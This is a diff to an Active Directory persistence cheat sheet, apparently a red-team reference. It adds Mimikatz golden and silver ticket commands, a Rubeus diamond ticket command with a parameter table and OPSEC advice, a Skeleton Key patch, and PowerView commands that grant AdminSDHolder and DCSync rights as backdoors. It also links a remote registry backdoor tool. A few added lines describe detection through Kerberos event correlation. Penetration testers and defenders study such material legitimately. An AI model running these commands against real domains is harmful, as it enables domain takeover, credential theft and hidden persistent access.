@@ -41,7 +41,7 @@ After that we need to create the ticket.
 ```powershell
 Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:corp.local /sid:S-1-5-21-268341927-4156873456-1784235843 /krbtgt:a9b30e5b0dc865eadcea9411e4ade72d /id:500 /groups:513 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
 
-Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:corp.local /sid:S-1-5-21-268341927-4156873456-1784235843 /krbtgt:a9b30e5b0dc865eadcea9411e4ade72d /id:500 /groups:513 /startoffset:0 /endin:600 /renewmax:10080 /ticket"'
+Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:corp.local /sid:S-1-5-21-268341927-4156873456-1784235843 /aes256:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /id:500 /groups:513 /startoffset:0 /endin:600 /renewmax:10080 /ticket"'
 ```
 > **Note**: `/ptt` injects the ticket in current PowerShell process.
 >
@@ -106,6 +106,10 @@ While creating a golden ticket the attacker creates some events in logs:
 Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List -Property *
 ```
 
+TGT lifetime is not logged in `4769` event, however it can be correlated when a `4769` event appears without a prior `4768` alert. It's not possible to request a TGS without a TGT, and if there is no record of a TGT being issued, we can assume that has been crafted offline.
+
+Other trick that defenders do is alert on `4769` for sensitive users such as default administrator account.
+
 [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets)
 
 [https://book.hacktricks.xyz/windows/active-directory-methodology/golden-ticket](https://book.hacktricks.xyz/windows/active-directory-methodology/golden-ticket)
@@ -137,6 +141,8 @@ After that we need to create the ticket.
 
 ```powershell
 Invoke-Mimikatz -Command '"kerberos::golden /domain:corp.local /sid:S-1-5-21-268341927-4156873456-1784235843 /target:dc.corp.local /service:CIFS /rc4:6f5b5acaf6744d567ac55e67ff22 /user:Administrator /id:500 /groups:512 /ptt"'
+
+Invoke-Mimikatz -Command '"kerberos::golden /domain:corp.local /sid:S-1-5-21-268341927-4156873456-1784235843 /target:dc.corp.local /service:CIFS /aes256:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /user:Administrator /id:500 /groups:512 /ptt"'
 ```
 > **Note**: `/ptt` injects the ticket in current PowerShell process.
 >
@@ -238,6 +244,37 @@ Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Forma
 ```
 > **RedTeam Note**: Silver Ticket is very hard to be detected.
 
+# Diamond Ticket
+
+A golden ticket is forged completely offline, encrypted with the krbtgt hash, and then passed into a logon session for use. Because DCs don't track if a TGT have been legitimately issued,they will accept TGTs that are encrypted with its own krbtgt hash.
+
+Like a golden ticket, a diamond ticket can be used to access any services as any user.
+
+A **diamond ticket** is made by modifying the fields of a legitimate TGT that was issued by a DC. This is achieved by requesting a TGT, decrypting it with the domain's krbtgt hash, modifying the desired fields of the ticket, then re-encrypting it. So:
+
+* TGS-REQs will have a preceding AS-REQ.
+* The TGT was issued by DC which means it will have all the correct details from the domain's kerberos policy.
+
+> **OPSEC Alert** `Diamond Ticket` is more silent than `Golden Ticket`.
+
+```
+.\Rubeus.exe diamond /tgtdeleg /ticketuser:jdoe /ticketuserid:11112 /gorups:512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /nowrap
+```
+
+| **Parameter** | **Description**                                                                                            |
+|:-------------:|------------------------------------------------------------------------------------------------------------|
+|   /tgtdeleg   | Uses the Kerberos GSS-API to obtain a useable TGT for the user.                                            |
+|  /ticketuser  | Username to impersonate                                                                                    |
+| /ticketuserid | Domain RID of that principal. Can be obtained with:  `Get-DomainUser -Identity jdoe -Properties objectsid` |
+|    /groups    | Desired group RID (512 - Domain Admins).                                                                   |
+|    /krbkey    | krbtgt AES256 hash                                                                                         |
+
+We can check that the TGT has been modified with `describe`:
+
+```
+.\Rubeus.exe describe /ticket:doIFYj[...snip...]MuSU8=
+```
+
 # Skeleton Key
 
 Skeleton Key is a persistence technique where it is possible to patch a Domain Controller (lsass process) so that it allows access as any user with a single password. The attack was discovered by Dell Secureworks used in a malware named the Skeleton Key Malware.
@@ -267,6 +304,10 @@ mimikatz# !+
 mimikatz# !processprotect /process:lsass.exe /remove
 mimikatz# misc::skeleton
 mimikatz# !-
+```
+
+```
+mimikatz# !misc::skeleton
 ```
 
 > **The DC can not be patched twice.**
@@ -419,6 +460,12 @@ Fist we need to add full controll permissions fo a user to the AdminSDHolder:
 ```powershell
 Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName user1 -Rights All -Verbose
 ```
+
+* PowerView (dev):
+```powershell
+Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=corp,DC=local' -PrincipalIdentity user1 -Rights All
+```
+
 * ADModule:
 ```powershell
 Set-ADACL -DistinguishedName 'CN=AdminSDHolder,CN=System,DC=corp,DC=local' -Principal user1 -Verbose 
@@ -456,6 +503,8 @@ Get-ObjectACL -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityRefer
 > **Note**: `GenericAll` means that has FullControl to an object.
 
 Finally we just need to abuse it.
+
+# ACL for Persistence
 
 ## Abusing FullControl ACL
 
@@ -498,13 +547,17 @@ Add-ObjectAcl -TargetDistinguishedName 'DC=corp,DC=local' -PrincipalSamAccountNa
 Set-ADACL -DistinguishedName 'DC=corp,DC=local' -Principal user1 -Verbose
 ```
 
-## Abusing DCSync in domain root
+## DCSync Backdoor
 
 There are even more intereting ACLs which can be abused. With DA privileges, the ACL for the domain root can be modified to provide useful rights like the ability to run `DCSync`.
 
 * PowerView:
 ```powershell
 Add-ObjectAcl -TargetDistinguishedName 'DC=corp,DC=local' -PrincipalSamAccountName user1 -Rights DCSync -Verbose
+```
+* PowerView (dev):
+```
+Add-DomainObjectAcl -TargetIdentity 'DC=corp,DC=local' -PrincipalIdentity user1 -Rights DCSync 
 ```
 
 * ADModule:
@@ -570,11 +623,14 @@ Set-RemotePSRemoting -UserName user1 -ComputerName dc01.corp.local -Verbose
 Set-RemotePSRemoting -UserName user1 -ComputerName dc01.corp.local -Remove
 ```
 
-## Remote Registry
+## Remote Registry Backdoor
 
 Using DAMP we can modify the registry with administrative privileges.
 
 On a remote machine with `Add-RemoteRegBackdoor.ps1` script.
+
+* [https://github.com/HarmJ0y/DAMP](https://github.com/HarmJ0y/DAMP)
+
 ```powershell
 Import-Module .\DAMP-master\Add-RemoteRegBackdoor.ps1
 Add-RemoteRegBackdoor -ComputerName dc01.corp.local -Trustee user1 -Verbose
